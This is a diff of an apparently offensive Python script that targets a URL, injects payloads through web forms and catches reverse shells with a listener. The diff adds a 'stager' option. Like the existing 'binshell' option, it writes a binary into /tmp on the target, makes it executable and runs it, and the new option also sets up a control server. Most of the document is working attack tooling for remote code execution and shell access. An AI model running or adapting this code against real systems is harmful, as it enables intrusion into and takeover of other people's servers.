@@ -2,13 +2,12 @@
 
 import argparse
 
-from payloads import Monkey, Generator
+from payloads import Monkey, Generator, ControlTower
 
 from server import ReverseListener
 
 import random
 import string
-import sys
 
 parser = argparse.ArgumentParser(description='Test')
 
@@ -33,8 +32,6 @@ parser.add_argument('-names', type=comma_separated, help="Comma-separated list o
 parser.add_argument('-v', '--verbose', action='store_true', help='Increase output verbosity')
 
 args = parser.parse_args()
-
-print('ARGS', args)
 
 print(f"target_url: {args.target_url}")
 
@@ -87,7 +84,7 @@ try:
     generator = Generator(lhost=LHOST, lport=LPORT)
 
     listener = ReverseListener(
-        ip=LHOST, port=LPORT, recv_cb=on_recv, success_cb=on_shell, once=False)
+        ip=LHOST, port=LPORT, cmd_cb=None, recv_cb=on_recv, success_cb=on_shell, once=False)
 
     listener.start()
 
@@ -100,11 +97,20 @@ try:
 
     if args.ptype == 'shell':
         pl = generator.ir_shell()
+
     elif args.ptype == 'binshell':
         pl_bin = generator.ir_bin()
         n = randword(4)
         pl = f'printf "{pl_bin}" > /tmp/{n} && chmod +x /tmp/{n} && /tmp/{n}'
-    elif args.ptype == 'custom':  # todo
+
+    elif args.ptype == 'stager':
+        pl_bin = generator.ir_master()
+        n = randword(4)
+        pl = f'printf "{pl_bin}" > /tmp/{n} && chmod +x /tmp/{n} && /tmp/{n}'
+
+        ct = ControlTower()
+
+    elif args.ptype == 'custom':
         pl = args.payload
 
     if monkey.get_forms():
